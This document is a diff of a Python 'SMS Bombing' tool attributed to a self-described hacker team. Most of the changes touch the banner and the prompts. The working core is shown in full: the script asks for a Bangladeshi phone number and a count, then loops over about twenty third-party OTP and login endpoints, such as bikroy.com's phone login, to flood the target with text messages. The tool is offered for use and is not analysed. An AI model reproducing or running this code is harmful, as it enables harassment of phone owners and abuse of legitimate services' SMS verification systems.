@@ -7,7 +7,7 @@ def Axak(xak):
 		sys.stdout.flush()
 		
 
-logo =                                          ("""   \033[1;91m
+logo =                                          ("""   \033[1;36m
 
   ____   ____  _____  _    _          _   _ 
  |  _ \ / __ \|  __ \| |  | |   /\   | \ | |
@@ -17,13 +17,22 @@ logo =                                          ("""   \033[1;91m
  |____/ \____/|_|  \_\_|  |_/_/    \_\_| \_|
       
 
-\033[1;91m\033[1;42m\033[1;97m            ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝗤𝗜𝗛𝗧 SMS ʙᴏᴍʙɪɴɢ            
-
+\033[1;42m\033[1;37m            WELCOME TO 𝗤𝗜𝗛𝗧 SMS BOMBING            
 \033[;0m\033[1;91m\033[1;92m
-\033[1;32m [🔶] TOOLS TYPE:\033[1;32m FREE 
-\033[1;32m [🔶] AUTHOR:\033[1;32m ᴘʀɪɴᴄᴇ ʙᴏʀʜᴀɴ 
-\033[1;32m [🔶] FACEBOOK GROUP :\033[1;32m 𝗤𝗮𝘄𝗺𝗶𝗮𝗻 𝗜𝘀𝗹𝗮𝗺𝗶𝗰 𝗛𝗮𝗰𝗸𝗲𝗿𝘀 𝗧𝗲𝗮𝗺 - 𝗤𝗜𝗛𝗧
 
+\033[1;31m•••••••••••••••••••••••••••••••••••••••••••••••••••
+\033[1;33m•••••••••••••••••••••••••••••••••••••••••••••••••••
+
+\033[1;32m [🔶] TOOL      \033[1;33m      : \033[1;96mSMS Bombing 
+\033[1;32m [🔶] STATUS          \033[1;33m: \033[1;96mFree 
+\033[1;32m [🔶] TOOL OWNER      \033[1;33m: \033[1;96mPrince Borhan 
+\033[1;32m [🔶] FACEBOOK ID     \033[1;33m: \033[1;96mprinceborhan973
+\033[1;32m [🔶] FACEBOOK GROUP  \033[1;33m: \033[1;96m𝗤𝗮𝘄𝗺𝗶𝗮𝗻 𝗜𝘀𝗹𝗮𝗺𝗶𝗰 𝗛𝗮𝗰𝗸𝗲𝗿𝘀 𝗧𝗲𝗮𝗺
+\033[1;32m [🔶] GITHUB          \033[1;33m: \033[1;96mrahmatullahburhan
+\033[1;32m [🔶] VERSION         \033[1;33m: \033[1;36m2.0.0
+
+\033[1;33m•••••••••••••••••••••••••••••••••••••••••••••••••••
+\033[1;31m•••••••••••••••••••••••••••••••••••••••••••••••••••
 
 """)
 
@@ -69,17 +78,16 @@ os.system("clear")
 
 print(logo)
 x="XAK"
-user=str(input(f"\n{c}  INBOX ME  FOR USERNAME AND PASSWORD \n \n{p}   ENTER USERNAME {g}➪ {y} "))
-pas=str(input(f"\n \n{p}   ENTER PASSWORD {g}➪ {y} "))
+user=str(input(f"\n{y}  Contact owner for username and password.  \n \n{p}   ENTER USERNAME {g}➪ {r} "))
+pas=str(input(f"\n \n{p}   ENTER PASSWORD {g}➪ {r} "))
 rp= 'BORHAN'
 x = 'QIHT'
 if 'BORHAN'==user and 'QIHT'==pas:
-	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL.")
-else:
-	Axak(r+"\n\n\t\t      Invalid User Or Pass")
-	Axak(y+"\n\n\t\t Contact Admin For User And Pass")
-	os.system("xdg-open https://www.facebook.com/profile.php?id=100035553099089&mibextid=ZbWKwL")
+	Axak(g+"\n\n\t   LOGIN SUCCESSFUL.")
 	
+else:
+	Axak(r+"\n\t  Invalid user or pass")
+	Axak(y+"\n Contact owner for user and pass ")
 	os.system("python QIHT.py")
 
 x="XAK"
@@ -107,18 +115,20 @@ os.system("clear")
 
 print (logo)
 
-print(w+" [📶] Please wait, checking Internet connection.......  ")
+print(w+" [📶] Please wait, checking Internet connection........... ")
 os.system('clear')
+
 print(logo)
+
 print(w+" [📶] Connecting To The Internet.......")
 try:
  request = requests.get("https://www.google.com/", timeout=2)
- print(g+" [✔] "+"\033[1;33m Connetcted ")
+ print(w+" [\033[1;32m✔ \033[1;37m] "+"\033[1;32mConnected ")
 except (requests.ConnectionError, requests.Timeout) as exception:
- print("\n\033[1;37m [\033[1;32m🔁 \033[1;37m] \033[1;91mCheck Your Internet Connection!")
-number=input(f"{c}\n [NUMBER]:{b} +880")
-amo=int(input(c+"\n [AMOUNT]: "+b))
-xak(f"\n\n\t {w} {g} STAY WITH QIHT ;) \n\n")
+ print("\n\033[1;37m [\033[1;32m❗\033[1;37m] \033[1;91mCheck Your Internet Connection!")
+number=input(f"{p}\n [NUMBER]:{y} +880")
+amo=int(input(p+"\n [AMOUNT]: "+y))
+xak(f"\n\t {w} {g} Stay with QIHT \n")
 os.system("clear")
 url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+number
 
@@ -264,50 +274,51 @@ data20 = '{"phone": "0'+number+'"}'
 
 print (logo)
 
-print(f"\n\t      {ran},----------------------------------,")
-print(f"\t{w}      | {r}    AMOUNT ({g}{amo}{r}){w} |   {r}   TIME       {w}|")
-print(f"\t      {ran}'----------------------------------'")
+print(f"\t\t {p}••••••••••••••••••••••")
+print(f"\t\t{p} ⋮ {w}SMS sending status {p}⋮ ")
+print(f"\t\t {p}••••••••••••••••••••••")
+
 for i in range(amo):
 	resp1 = requests.get(url1)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp2 = requests.get(url2,headers=headers2)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp3 = requests.post(url3, headers=headers3, data=data3)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp4 = requests.post(url4, headers=headers4, data=data4)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp5 = requests.post(url5, headers=headers5, data=data5)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp6 = requests.post(url6, headers=headers6, data=data6)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp7 = requests.get(url7)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp10 = requests.get(url8,headers=headers8, data=data8)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp11 = requests.get(url9,headers=headers9, data=data9)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp12 = requests.post(url10,headers=headers10, data=data10)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp13 = requests.get(url11,headers=headers11, data=data11)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp14 = requests.post(url12,data=data12)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp8 = requests.post(url13,headers=headers13, data=data13)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp17 = requests.post(url14, headers=headers14, data=data14)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp9 = requests.post(url15, headers=headers15, data=data15)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp19 = requests.post(url16, headers=headers16, data=data16)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp20 = requests.post(url17,data17)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT  "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT  " )
 	resp21 = requests.post(url18, headers=headers18, data=data18)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp21 = requests.post(url19, headers=headers19, data=data19)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	resp21 = requests.post(url20, headers=headers20, data=data20)
-	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY  BY QIHT "+w+tim)
+	print(f"\n\t {ran2}SMS successfully sent by  QIHT " )
 	
 	
 else: 
